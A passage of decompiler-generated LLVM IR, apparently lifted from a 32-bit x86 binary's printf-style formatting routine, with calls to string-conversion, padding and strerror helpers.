  br label %dec_label_pc_804e135

dec_label_pc_804e135:                             ; preds = %dec_label_pc_804e11c, %dec_label_pc_804e130
  %v0_804e15b = phi i32 [ %v3_804e123, %dec_label_pc_804e11c ], [ 1, %dec_label_pc_804e130 ]
  %v1_804e135 = add i32 %v0_804e17e, 32
  %v2_804e135 = inttoptr i32 %v1_804e135 to i8*
  %v3_804e135 = load i8, i8* %v2_804e135, align 1
  %v4_804e135 = and i8 %v3_804e135, 16
  %v5_804e135 = icmp eq i8 %v4_804e135, 0
  br i1 %v5_804e135, label %dec_label_pc_804e16f, label %dec_label_pc_804e13c

dec_label_pc_804e13c:                             ; preds = %dec_label_pc_804e135
  %v1_804e13c = add i32 %v0_804e17e, 48
  %v2_804e13c = inttoptr i32 %v1_804e13c to i32*
  %v3_804e13c = load i32, i32* %v2_804e13c, align 4
  store i32 %v3_804e13c, i32* %eax.global-to-local, align 4
  %tmp97 = icmp ult i32 %v3_804e13c, 3
  br i1 %tmp97, label %dec_label_pc_804e156.thread, label %dec_label_pc_804e14a

dec_label_pc_804e156.thread:                      ; preds = %dec_label_pc_804e13c
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_804e16f

dec_label_pc_804e14a:                             ; preds = %dec_label_pc_804e13c
  %v9_804e14a = icmp eq i32 %v3_804e13c, 3
  %v1_804e14d = icmp eq i1 %v9_804e14a, false
  br i1 %v1_804e14d, label %dec_label_pc_804e156, label %dec_label_pc_804e14f

dec_label_pc_804e14f:                             ; preds = %dec_label_pc_804e14a
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804e16f

dec_label_pc_804e156:                             ; preds = %dec_label_pc_804e14a
  %v9_804e156 = icmp eq i32 %v3_804e13c, 4
  %v1_804e159 = icmp eq i1 %v9_804e156, false
  br i1 %v1_804e159, label %dec_label_pc_804e16f, label %dec_label_pc_804e15b

dec_label_pc_804e15b:                             ; preds = %dec_label_pc_804e156
  %tmp98 = icmp ugt i32 %v0_804e15b, %v1_804e12b
  br i1 %tmp98, label %dec_label_pc_804e16f, label %dec_label_pc_804e15f

dec_label_pc_804e15f:                             ; preds = %dec_label_pc_804e15b
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804e164 = inttoptr i32 %v0_804e16f to i8*
  %v2_804e164 = load i8, i8* %v1_804e164, align 1
  %v8_804e164 = icmp eq i8 %v2_804e164, 48
  br i1 %v8_804e164, label %dec_label_pc_804e16f, label %dec_label_pc_804e169

dec_label_pc_804e169:                             ; preds = %dec_label_pc_804e15f
  %v1_804e169 = add i32 %v2_804e127, 128
  store i32 %v1_804e169, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e16f

dec_label_pc_804e16f:                             ; preds = %dec_label_pc_804e156.thread, %dec_label_pc_804e15b, %dec_label_pc_804e15f, %dec_label_pc_804e156, %dec_label_pc_804e135, %dec_label_pc_804e14f, %dec_label_pc_804e169
  %v0_804e1a7 = phi i32 [ %v0_804e15b, %dec_label_pc_804e15b ], [ 1, %dec_label_pc_804e15f ], [ %v0_804e15b, %dec_label_pc_804e156 ], [ %v0_804e15b, %dec_label_pc_804e135 ], [ %v0_804e15b, %dec_label_pc_804e14f ], [ %v1_804e169, %dec_label_pc_804e169 ], [ %v0_804e15b, %dec_label_pc_804e156.thread ]
  %v1_804e16f = inttoptr i32 %v0_804e16f to i8*
  %v2_804e16f = load i8, i8* %v1_804e16f, align 1
  %v8_804e16f = icmp eq i8 %v2_804e16f, 48
  %v1_804e172 = icmp eq i1 %v8_804e16f, false
  br i1 %v1_804e172, label %dec_label_pc_804e19f, label %dec_label_pc_804e174

dec_label_pc_804e174:                             ; preds = %dec_label_pc_804e16f
  %v0_804e174 = load i32, i32* @ebp, align 4
  %v7_804e177 = icmp sgt i32 %v0_804e174, 5
  br i1 %v7_804e177, label %dec_label_pc_804e179, label %dec_label_pc_804e17e

dec_label_pc_804e179:                             ; preds = %dec_label_pc_804e174
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_804e17e

dec_label_pc_804e17e:                             ; preds = %dec_label_pc_804e174, %dec_label_pc_804e179
  %v1_804e17e = add i32 %v0_804e17e, 48
  %v2_804e17e = inttoptr i32 %v1_804e17e to i32*
  %v3_804e17e = load i32, i32* %v2_804e17e, align 4
  %v12_804e17e = icmp eq i32 %v3_804e17e, 1
  %v1_804e183 = icmp eq i1 %v12_804e17e, false
  br i1 %v1_804e183, label %dec_label_pc_804e194, label %dec_label_pc_804e185

dec_label_pc_804e185:                             ; preds = %dec_label_pc_804e17e
  store i32 ptrtoint ([6 x i8]* @global_var_8050980.114 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_804e310

dec_label_pc_804e194:                             ; preds = %dec_label_pc_804e17e
  %v1_804e194 = icmp eq i32 %v0_804e1a7, 0
  %v1_804e196 = icmp eq i1 %v1_804e194, false
  br i1 %v1_804e196, label %dec_label_pc_804e19f, label %dec_label_pc_804e198

dec_label_pc_804e198:                             ; preds = %dec_label_pc_804e194
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804e310

dec_label_pc_804e19f:                             ; preds = %dec_label_pc_804e194, %dec_label_pc_804e16f
  %v2_804e19f = sub i32 %v0_804e1a7, %v1_804e12b
  %v7_804e19f = icmp ult i32 %v0_804e1a7, %v1_804e12b
  %v12_804e19f = icmp eq i32 %v2_804e19f, 0
  %v2_804e1a1 = or i1 %v7_804e19f, %v12_804e19f
  br i1 %v2_804e1a1, label %dec_label_pc_804e310, label %dec_label_pc_804e1a7

dec_label_pc_804e1a7:                             ; preds = %dec_label_pc_804e19f
  store i32 %v2_804e19f, i32* @ebx, align 4
  br label %dec_label_pc_804e32a

dec_label_pc_804e1b0:                             ; preds = %dec_label_pc_804e046
  %tmp99 = icmp ult i32 %v3_804e018, 16
  br i1 %tmp99, label %dec_label_pc_804e1b5, label %dec_label_pc_804e1fa

dec_label_pc_804e1b5:                             ; preds = %dec_label_pc_804e1b0
  %v1_804e1b5 = add i32 %v0_804e018.lcssa, 33
  %v2_804e1b5 = inttoptr i32 %v1_804e1b5 to i8*
  %v3_804e1b5 = load i8, i8* %v2_804e1b5, align 1
  %v4_804e1b5 = and i8 %v3_804e1b5, 8
  %v5_804e1b5 = icmp eq i8 %v4_804e1b5, 0
  %v1_804e1ba = add i32 %v0_804e018.lcssa, 344
  %v2_804e1ba = inttoptr i32 %v1_804e1ba to i32*
  %v3_804e1ba = load i32, i32* %v2_804e1ba, align 4
  store i32 %v3_804e1ba, i32* %edx.global-to-local, align 4
  br i1 %v5_804e1b5, label %dec_label_pc_804e1c7, label %dec_label_pc_804e1c3

dec_label_pc_804e1c3:                             ; preds = %dec_label_pc_804e1b5
  %v1_804e1c3 = inttoptr i32 %v3_804e1ba to x86_fp80*
  %v2_804e1c3 = load x86_fp80, x86_fp80* %v1_804e1c3, align 4
  br label %dec_label_pc_804e1c9

dec_label_pc_804e1c7:                             ; preds = %dec_label_pc_804e1b5
  %v1_804e1c7 = inttoptr i32 %v3_804e1ba to double*
  %v2_804e1c7 = load double, double* %v1_804e1c7, align 4
  %v3_804e1c7 = fpext double %v2_804e1c7 to x86_fp80
  br label %dec_label_pc_804e1c9

dec_label_pc_804e1c9:                             ; preds = %dec_label_pc_804e1c3, %dec_label_pc_804e1c7
  %storemerge5 = phi x86_fp80 [ %v2_804e1c3, %dec_label_pc_804e1c3 ], [ %v3_804e1c7, %dec_label_pc_804e1c7 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_804e1c9 = load i32, i32* @esi, align 4
  %v2_804e1c9 = add i32 %v0_804e018.lcssa, -4
  %v3_804e1c9 = inttoptr i32 %v2_804e1c9 to i32*
  store i32 %v0_804e1c9, i32* %v3_804e1c9, align 4
  %v0_804e1ca = load i32, i32* @esi, align 4
  %v2_804e1ca = add i32 %v0_804e018.lcssa, -8
  %v3_804e1ca = inttoptr i32 %v2_804e1ca to i32*
  store i32 %v0_804e1ca, i32* %v3_804e1ca, align 4
  %v1_804e1cb = add i32 %v0_804e018.lcssa, -12
  %v2_804e1cb = inttoptr i32 %v1_804e1cb to i32*
  store i32 134536846, i32* %v2_804e1cb, align 4
  %v1_804e1d0 = add i32 %v0_804e018.lcssa, 20
  store i32 %v1_804e1d0, i32* %eax.global-to-local, align 4
  %v2_804e1d4 = add i32 %v0_804e018.lcssa, -16
  %v3_804e1d4 = inttoptr i32 %v2_804e1d4 to i32*
  store i32 %v1_804e1d0, i32* %v3_804e1d4, align 4
  %v1_804e1d5 = add i32 %v0_804e018.lcssa, -28
  %v1_804e1d8 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804e1d8 = inttoptr i32 %v1_804e1d5 to x86_fp80*
  store x86_fp80 %v1_804e1d8, x86_fp80* %v3_804e1d8, align 4
  %v1_804e1db = add i32 %v0_804e018.lcssa, 368
  %v2_804e1db = inttoptr i32 %v1_804e1db to i32*
  %v3_804e1db = load i32, i32* %v2_804e1db, align 4
  %v5_804e1db = add i32 %v0_804e018.lcssa, -32
  %v6_804e1db = inttoptr i32 %v5_804e1db to i32*
  store i32 %v3_804e1db, i32* %v6_804e1db, align 4
  %v0_804e1e2 = call i32 @_fpmaxtostr()
  store i32 %v0_804e1e2, i32* %eax.global-to-local, align 4
  %v0_804e1e7 = load i32, i32* @esp, align 4
  %v1_804e1e7 = add i32 %v0_804e1e7, 32
  %v2_804e1ea = icmp slt i32 %v0_804e1e2, 0
  br i1 %v2_804e1ea, label %dec_label_pc_804e48b, label %dec_label_pc_804e1f2

dec_label_pc_804e1f2:                             ; preds = %dec_label_pc_804e1c9
  %v1_804e1f2 = inttoptr i32 %v1_804e1e7 to i32*
  %v2_804e1f2 = load i32, i32* %v1_804e1f2, align 4
  %v4_804e1f2 = add i32 %v2_804e1f2, %v0_804e1e2
  store i32 %v4_804e1f2, i32* %v1_804e1f2, align 4
  %v0_804e478.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e478

dec_label_pc_804e1fa:                             ; preds = %dec_label_pc_804e1b0
  %tmp100 = or i32 %v3_804e018, 1
  %tmp101 = icmp eq i32 %tmp100, 17
  br i1 %tmp101, label %dec_label_pc_804e203, label %dec_label_pc_804e296

dec_label_pc_804e203:                             ; preds = %dec_label_pc_804e1fa
  %v9_804e1fa = icmp eq i32 %v3_804e018, 17
  %v1_804e203 = add i32 %v0_804e018.lcssa, 332
  %v2_804e203 = inttoptr i32 %v1_804e203 to i32*
  store i32 0, i32* %v2_804e203, align 4
  %v0_804e20e = load i32, i32* @esp, align 4
  %v1_804e20e = add i32 %v0_804e20e, 344
  %v2_804e20e = inttoptr i32 %v1_804e20e to i32*
  %v3_804e20e = load i32, i32* %v2_804e20e, align 4
  store i32 %v3_804e20e, i32* %edx.global-to-local, align 4
  %v1_804e215 = icmp eq i1 %v9_804e1fa, false
  br i1 %v1_804e215, label %dec_label_pc_804e261, label %dec_label_pc_804e217

dec_label_pc_804e217:                             ; preds = %dec_label_pc_804e203
  %v1_804e217 = inttoptr i32 %v3_804e20e to i32*
  %v2_804e217 = load i32, i32* %v1_804e217, align 4
  store i32 %v2_804e217, i32* %eax.global-to-local, align 4
  %v2_804e219 = add i32 %v0_804e20e, 340
  %v3_804e219 = inttoptr i32 %v2_804e219 to i32*
  store i32 %v2_804e217, i32* %v3_804e219, align 4
  %v0_804e220 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e220 = icmp eq i32 %v0_804e220, 0
  br i1 %v1_804e220, label %dec_label_pc_804e314, label %dec_label_pc_804e228

dec_label_pc_804e228:                             ; preds = %dec_label_pc_804e217
  %v0_804e228 = load i32, i32* @esp, align 4
  %v1_804e228 = add i32 %v0_804e228, 20
  %v2_804e228 = inttoptr i32 %v1_804e228 to i32*
  %v3_804e228 = load i32, i32* %v2_804e228, align 4
  store i32 %v3_804e228, i32* %eax.global-to-local, align 4
  %v2_804e22f = icmp slt i32 %v3_804e228, 0
  br i1 %v2_804e22f, label %dec_label_pc_804e235, label %dec_label_pc_804e233

dec_label_pc_804e233:                             ; preds = %dec_label_pc_804e228
  br label %dec_label_pc_804e235

dec_label_pc_804e235:                             ; preds = %dec_label_pc_804e228, %dec_label_pc_804e233
  %storemerge105 = phi i32 [ %v3_804e228, %dec_label_pc_804e233 ], [ -1, %dec_label_pc_804e228 ]
  store i32 %storemerge105, i32* %ecx.global-to-local, align 4
  %v1_804e235 = add i32 %v0_804e228, 340
  store i32 %v1_804e235, i32* %edx.global-to-local, align 4
  %v1_804e23c = add i32 %v0_804e228, 332
  store i32 %v1_804e23c, i32* %eax.global-to-local, align 4
  %v2_804e243 = add i32 %v0_804e228, -4
  %v3_804e243 = inttoptr i32 %v2_804e243 to i32*
  store i32 %v1_804e23c, i32* %v3_804e243, align 4
  %v0_804e244 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e244 = add i32 %v0_804e228, -8
  %v3_804e244 = inttoptr i32 %v2_804e244 to i32*
  store i32 %v0_804e244, i32* %v3_804e244, align 4
  %v0_804e245 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e245 = add i32 %v0_804e228, -12
  %v3_804e245 = inttoptr i32 %v2_804e245 to i32*
  store i32 %v0_804e245, i32* %v3_804e245, align 4
  %v0_804e246 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e246 = add i32 %v0_804e228, -16
  %v3_804e246 = inttoptr i32 %v2_804e246 to i32*
  store i32 %v0_804e246, i32* %v3_804e246, align 4
  %v0_804e247 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e247, i32* %eax.global-to-local, align 4
  %v0_804e24c = load i32, i32* @esp, align 4
  %v1_804e24c = add i32 %v0_804e24c, 16
  store i32 %v0_804e247, i32* @esi, align 4
  %v10_804e251 = icmp eq i32 %v0_804e247, -1
  br i1 %v10_804e251, label %dec_label_pc_804e48b, label %dec_label_pc_804e25a

dec_label_pc_804e25a:                             ; preds = %dec_label_pc_804e235
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e31e

dec_label_pc_804e261:                             ; preds = %dec_label_pc_804e203
  %v0_804e261 = load i32, i32* @ebx, align 4
  %v2_804e261 = add i32 %v0_804e20e, -4
  %v3_804e261 = inttoptr i32 %v2_804e261 to i32*
  store i32 %v0_804e261, i32* %v3_804e261, align 4
  %v1_804e262 = add i32 %v0_804e20e, 332
  store i32 %v1_804e262, i32* %eax.global-to-local, align 4
  %v2_804e269 = add i32 %v0_804e20e, -8
  %v3_804e269 = inttoptr i32 %v2_804e269 to i32*
  store i32 %v1_804e262, i32* %v3_804e269, align 4
  %v0_804e26a = load i32, i32* %edx.global-to-local, align 4
  %v1_804e26a = inttoptr i32 %v0_804e26a to i32*
  %v2_804e26a = load i32, i32* %v1_804e26a, align 4
  %v4_804e26a = add i32 %v0_804e20e, -12
  %v5_804e26a = inttoptr i32 %v4_804e26a to i32*
  store i32 %v2_804e26a, i32* %v5_804e26a, align 4
  %v1_804e26c = add i32 %v0_804e20e, 204
  store i32 %v1_804e26c, i32* @ebx, align 4
  %v2_804e273 = add i32 %v0_804e20e, -16
  %v3_804e273 = inttoptr i32 %v2_804e273 to i32*
  store i32 %v1_804e26c, i32* %v3_804e273, align 4
  %v0_804e274 = call i32 @__GI_wcrtomb()
  store i32 %v0_804e274, i32* %eax.global-to-local, align 4
  %v0_804e279 = load i32, i32* @esp, align 4
  %v1_804e279 = add i32 %v0_804e279, 16
  store i32 %v0_804e274, i32* @esi, align 4
  %v10_804e27e = icmp eq i32 %v0_804e274, -1
  br i1 %v10_804e27e, label %dec_label_pc_804e48b, label %dec_label_pc_804e287

dec_label_pc_804e287:                             ; preds = %dec_label_pc_804e261
  %v0_804e287 = load i32, i32* @ebx, align 4
  store i32 %v0_804e287, i32* @edi, align 4
  %v2_804e289 = add i32 %v0_804e274, 220
  %v3_804e289 = add i32 %v2_804e289, %v0_804e279
  %v4_804e289 = inttoptr i32 %v3_804e289 to i8*
  store i8 0, i8* %v4_804e289, align 1
  br label %dec_label_pc_804e31e

dec_label_pc_804e296:                             ; preds = %dec_label_pc_804e1fa
  %tmp102 = icmp ult i32 %v3_804e018, 20
  br i1 %tmp102, label %dec_label_pc_804e29b, label %dec_label_pc_804e2e6

dec_label_pc_804e29b:                             ; preds = %dec_label_pc_804e296
  %v9_804e296 = icmp eq i32 %v3_804e018, 19
  %v1_804e29b = add i32 %v0_804e018.lcssa, 344
  %v2_804e29b = inttoptr i32 %v1_804e29b to i32*
  %v3_804e29b = load i32, i32* %v2_804e29b, align 4
  store i32 %v3_804e29b, i32* %edx.global-to-local, align 4
  %v1_804e2a2 = icmp eq i1 %v9_804e296, false
  %v1_804e2c7 = inttoptr i32 %v3_804e29b to i32*
  %v2_804e2c7 = load i32, i32* %v1_804e2c7, align 4
  br i1 %v1_804e2a2, label %dec_label_pc_804e2c7, label %dec_label_pc_804e2a4

dec_label_pc_804e2a4:                             ; preds = %dec_label_pc_804e29b
  store i32 %v2_804e2c7, i32* @edi, align 4
  %v1_804e2a6 = icmp eq i32 %v2_804e2c7, 0
  br i1 %v1_804e2a6, label %dec_label_pc_804e314, label %dec_label_pc_804e2aa

dec_label_pc_804e2aa:                             ; preds = %dec_label_pc_804e2a4, %dec_label_pc_804e2ef
  %v1_804e2b7 = phi i32 [ %v0_804e018.lcssa, %dec_label_pc_804e2a4 ], [ %v1_804e309, %dec_label_pc_804e2ef ]
  %v1_804e2aa = add i32 %v1_804e2b7, 20
  %v2_804e2aa = inttoptr i32 %v1_804e2aa to i32*
  %v3_804e2aa = load i32, i32* %v2_804e2aa, align 4
  store i32 %v3_804e2aa, i32* %eax.global-to-local, align 4
  %v2_804e2b1 = icmp slt i32 %v3_804e2aa, 0
  br i1 %v2_804e2b1, label %dec_label_pc_804e2b7, label %dec_label_pc_804e2b5

dec_label_pc_804e2b5:                             ; preds = %dec_label_pc_804e2aa
  br label %dec_label_pc_804e2b7

dec_label_pc_804e2b7:                             ; preds = %dec_label_pc_804e2aa, %dec_label_pc_804e2b5
  %storemerge = phi i32 [ %v3_804e2aa, %dec_label_pc_804e2b5 ], [ -1, %dec_label_pc_804e2aa ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804e2b7 = add i32 %v1_804e2b7, -4
  %v3_804e2b7 = inttoptr i32 %v2_804e2b7 to i32*
  store i32 %v3_804e018, i32* %v3_804e2b7, align 4
  %v2_804e2b8 = add i32 %v1_804e2b7, -8
  %v3_804e2b8 = inttoptr i32 %v2_804e2b8 to i32*
  store i32 %v3_804e018, i32* %v3_804e2b8, align 4
  %v0_804e2b9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e2b9 = add i32 %v1_804e2b7, -12
  %v3_804e2b9 = inttoptr i32 %v2_804e2b9 to i32*
  store i32 %v0_804e2b9, i32* %v3_804e2b9, align 4
  %v0_804e2ba = load i32, i32* @edi, align 4
  %v2_804e2ba = add i32 %v1_804e2b7, -16
  %v3_804e2ba = inttoptr i32 %v2_804e2ba to i32*
  store i32 %v0_804e2ba, i32* %v3_804e2ba, align 4
  %v0_804e2bb = call i32 @strnlen()
  store i32 %v0_804e2bb, i32* %eax.global-to-local, align 4
  store i32 %v0_804e2bb, i32* @esi, align 4
  br label %dec_label_pc_804e31e

dec_label_pc_804e2c7:                             ; preds = %dec_label_pc_804e29b
  store i32 %v2_804e2c7, i32* %eax.global-to-local, align 4
  %v1_804e2c9 = add i32 %v0_804e018.lcssa, 204
  store i32 %v1_804e2c9, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804e2d5 = trunc i32 %v2_804e2c7 to i8
  %v4_804e2d5 = inttoptr i32 %v1_804e2c9 to i8*
  store i8 %v1_804e2d5, i8* %v4_804e2d5, align 1
  %v0_804e2dc = load i32, i32* @esp, align 4
  %v1_804e2dc = add i32 %v0_804e2dc, 205
  %v2_804e2dc = inttoptr i32 %v1_804e2dc to i8*
  store i8 0, i8* %v2_804e2dc, align 1
  br label %dec_label_pc_804e31e

dec_label_pc_804e2e6:                             ; preds = %dec_label_pc_804e296
  %v9_804e2e6 = icmp eq i32 %v3_804e018, 20
  %v1_804e2e9 = icmp eq i1 %v9_804e2e6, false
  br i1 %v1_804e2e9, label %dec_label_pc_804e48b, label %dec_label_pc_804e2ef

dec_label_pc_804e2ef:                             ; preds = %dec_label_pc_804e2e6
  %v0_804e2ef = load i32, i32* %stack_var_-364, align 4
  %v1_804e2ef = call i32 @__errno_location(i32 %v0_804e2ef)
  store i32 %v1_804e2ef, i32* %eax.global-to-local, align 4
  %v0_804e2f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e2f4 = load i32, i32* @esp, align 4
  %v2_804e2f4 = add i32 %v1_804e2f4, -4
  %v3_804e2f4 = inttoptr i32 %v2_804e2f4 to i32*
  store i32 %v0_804e2f4, i32* %v3_804e2f4, align 4
  %v1_804e2f5 = add i32 %v1_804e2f4, -8
  %v2_804e2f5 = inttoptr i32 %v1_804e2f5 to i32*
  store i32 128, i32* %v2_804e2f5, align 4
  %v1_804e2fa = add i32 %v1_804e2f4, 204
  store i32 %v1_804e2fa, i32* %edx.global-to-local, align 4
  %v2_804e301 = add i32 %v1_804e2f4, -12
  %v3_804e301 = inttoptr i32 %v2_804e301 to i32*
  store i32 %v1_804e2fa, i32* %v3_804e301, align 4
  %v1_804e302 = inttoptr i32 %v1_804e2ef to i32*
  %v2_804e302 = load i32, i32* %v1_804e302, align 4
  %v4_804e302 = add i32 %v1_804e2f4, -16
  %v5_804e302 = inttoptr i32 %v4_804e302 to i32*
  store i32 %v2_804e302, i32* %v5_804e302, align 4
  %v0_804e304 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804e304, i32* %eax.global-to-local, align 4
  %v0_804e309 = load i32, i32* @esp, align 4
  %v1_804e309 = add i32 %v0_804e309, 16
  store i32 %v0_804e304, i32* @edi, align 4
  br label %dec_label_pc_804e2aa

dec_label_pc_804e310:                             ; preds = %dec_label_pc_804e19f, %dec_label_pc_804e198, %dec_label_pc_804e185
  %v0_804e32a37 = phi i32 [ %v1_804e12b, %dec_label_pc_804e19f ], [ 0, %dec_label_pc_804e198 ], [ 5, %dec_label_pc_804e185 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e32a

dec_label_pc_804e314:                             ; preds = %dec_label_pc_804e2a4, %dec_label_pc_804e217
  store i32 ptrtoint ([7 x i8]* @global_var_8050986.115 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804e31e

dec_label_pc_804e31e:                             ; preds = %dec_label_pc_804e2c7, %dec_label_pc_804e2b7, %dec_label_pc_804e287, %dec_label_pc_804e25a, %dec_label_pc_804e314
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804e325 = load i32, i32* @esp, align 4
  %v1_804e325 = add i32 %v0_804e325, 7
  %v2_804e325 = inttoptr i32 %v1_804e325 to i8*
  store i8 32, i8* %v2_804e325, align 1
  %v0_804e32a.pre = load i32, i32* @esi, align 4
  %v1_804e32a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e32a

dec_label_pc_804e32a:                             ; preds = %dec_label_pc_804e310, %dec_label_pc_804e1a7, %dec_label_pc_804e31e
  %v1_804e32a = phi i32 [ 0, %dec_label_pc_804e310 ], [ %v2_804e19f, %dec_label_pc_804e1a7 ], [ %v1_804e32a.pre, %dec_label_pc_804e31e ]
  %v0_804e32a = phi i32 [ %v0_804e32a37, %dec_label_pc_804e310 ], [ %v1_804e12b, %dec_label_pc_804e1a7 ], [ %v0_804e32a.pre, %dec_label_pc_804e31e ]
  %v2_804e32a = add i32 %v0_804e32a, %v1_804e32a
  store i32 %v2_804e32a, i32* @edx, align 4
  %v0_804e32d = load i32, i32* @ebp, align 4
  %v9_804e32d = icmp eq i32 %v0_804e32d, 11
  br i1 %v9_804e32d, label %dec_label_pc_804e33e, label %dec_label_pc_804e332

dec_label_pc_804e332:                             ; preds = %dec_label_pc_804e32a
  %v1_804e334 = add i32 %v0_804e32d, -5
  %v6_804e334 = sub i32 4, %v0_804e32d
  %v7_804e334 = and i32 %v6_804e334, %v0_804e32d
  %v8_804e334 = icmp slt i32 %v7_804e334, 0
  %v9_804e334 = icmp eq i32 %v1_804e334, 0
  %v10_804e334 = icmp slt i32 %v1_804e334, 0
  %v3_804e337 = icmp eq i1 %v10_804e334, %v8_804e334
  %v4_804e337 = icmp eq i1 %v9_804e334, false
  %v5_804e337 = and i1 %v4_804e337, %v3_804e337
  %v6_804e337 = zext i1 %v5_804e337 to i32
  store i32 %v6_804e337, i32* %eax.global-to-local, align 4
  %v2_804e33a = add i32 %v2_804e32a, 1
  %v3_804e33a = add i32 %v2_804e33a, %v6_804e337
  store i32 %v3_804e33a, i32* @edx, align 4
  br label %dec_label_pc_804e33e

dec_label_pc_804e33e:                             ; preds = %dec_label_pc_804e32a, %dec_label_pc_804e332
  %v0_804e33e = load i32, i32* @esp, align 4
  %v1_804e33e = add i32 %v0_804e33e, 24
  %v2_804e33e = inttoptr i32 %v1_804e33e to i32*
  %v3_804e33e = load i32, i32* %v2_804e33e, align 4
  store i32 %v3_804e33e, i32* %eax.global-to-local, align 4
  %v1_804e342 = add i32 %v0_804e33e, 8
  %v2_804e342 = inttoptr i32 %v1_804e342 to i32*
  store i32 0, i32* %v2_804e342, align 4
  %v0_804e34a = load i32, i32* %eax.global-to-local, align 4
  %v1_804e34a = load i32, i32* @edx, align 4
  %v2_804e34a = sub i32 %v0_804e34a, %v1_804e34a
  %v7_804e34a = icmp ult i32 %v0_804e34a, %v1_804e34a
  %v12_804e34a = icmp eq i32 %v2_804e34a, 0
  %v2_804e34c = or i1 %v7_804e34a, %v12_804e34a
  br i1 %v2_804e34c, label %dec_label_pc_804e354, label %dec_label_pc_804e34e

dec_label_pc_804e34e:                             ; preds = %dec_label_pc_804e33e
  store i32 %v2_804e34a, i32* %eax.global-to-local, align 4
  %v1_804e350 = load i32, i32* @esp, align 4
  %v2_804e350 = add i32 %v1_804e350, 8
  %v3_804e350 = inttoptr i32 %v2_804e350 to i32*
  store i32 %v2_804e34a, i32* %v3_804e350, align 4
  %v0_804e358.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e354

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e33e, %dec_label_pc_804e34e
  %v0_804e358 = phi i32 [ %v1_804e34a, %dec_label_pc_804e33e ], [ %v0_804e358.pre, %dec_label_pc_804e34e ]
  %v0_804e354 = load i32, i32* @esp, align 4
  %v1_804e354 = add i32 %v0_804e354, 8
  %v2_804e354 = inttoptr i32 %v1_804e354 to i32*
  %v3_804e354 = load i32, i32* %v2_804e354, align 4
  store i32 %v3_804e354, i32* @ecx, align 4
  %v2_804e358 = add i32 %v3_804e354, %v0_804e358
  store i32 %v2_804e358, i32* %eax.global-to-local, align 4
  %v1_804e35b = inttoptr i32 %v0_804e354 to i32*
  %v2_804e35b = load i32, i32* %v1_804e35b, align 4
  %v4_804e35b = add i32 %v2_804e35b, %v2_804e358
  store i32 %v4_804e35b, i32* %v1_804e35b, align 4
  %v0_804e35e = load i32, i32* @esp, align 4
  %v1_804e35e = add i32 %v0_804e35e, 7
  %v2_804e35e = inttoptr i32 %v1_804e35e to i8*
  %v3_804e35e = load i8, i8* %v2_804e35e, align 1
  %v9_804e35e = icmp eq i8 %v3_804e35e, 48
  %v1_804e363 = icmp eq i1 %v9_804e35e, false
  br i1 %v1_804e363, label %dec_label_pc_804e36f, label %dec_label_pc_804e365

dec_label_pc_804e365:                             ; preds = %dec_label_pc_804e354
  %v0_804e365 = load i32, i32* @ebx, align 4
  %v1_804e365 = load i32, i32* @ecx, align 4
  %v2_804e365 = add i32 %v1_804e365, %v0_804e365
  store i32 %v2_804e365, i32* @ebx, align 4
  %v1_804e367 = add i32 %v0_804e35e, 8
  %v2_804e367 = inttoptr i32 %v1_804e367 to i32*
  store i32 0, i32* %v2_804e367, align 4
  %v0_804e36f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e36f

dec_label_pc_804e36f:                             ; preds = %dec_label_pc_804e354, %dec_label_pc_804e365
  %v0_804e376 = phi i32 [ %v0_804e35e, %dec_label_pc_804e354 ], [ %v0_804e36f.pre, %dec_label_pc_804e365 ]
  %v1_804e36f = add i32 %v0_804e376, 32
  %v2_804e36f = inttoptr i32 %v1_804e36f to i8*
  %v3_804e36f = load i8, i8* %v2_804e36f, align 1
  %v4_804e36f = and i8 %v3_804e36f, 8
  %v5_804e36f = icmp eq i8 %v4_804e36f, 0
  %v1_804e374 = icmp eq i1 %v5_804e36f, false
  br i1 %v1_804e374, label %dec_label_pc_804e39d, label %dec_label_pc_804e376

dec_label_pc_804e376:                             ; preds = %dec_label_pc_804e36f
  %v1_804e376 = add i32 %v0_804e376, 8
  %v2_804e376 = inttoptr i32 %v1_804e376 to i32*
  %v3_804e376 = load i32, i32* %v2_804e376, align 4
  store i32 %v3_804e376, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e37f = add i32 %v0_804e376, 368
  %v2_804e37f = inttoptr i32 %v1_804e37f to i32*
  %v3_804e37f = load i32, i32* %v2_804e37f, align 4
  store i32 %v3_804e37f, i32* @eax, align 4
  %v0_804e386 = call i32 @_charpad()
  store i32 %v0_804e386, i32* %eax.global-to-local, align 4
  %v1_804e38b = load i32, i32* @esp, align 4
  %v2_804e38b = add i32 %v1_804e38b, 8
  %v3_804e38b = inttoptr i32 %v2_804e38b to i32*
  %v4_804e38b = load i32, i32* %v3_804e38b, align 4
  %v15_804e38b = icmp eq i32 %v0_804e386, %v4_804e38b
  %v1_804e38f = icmp eq i1 %v15_804e38b, false
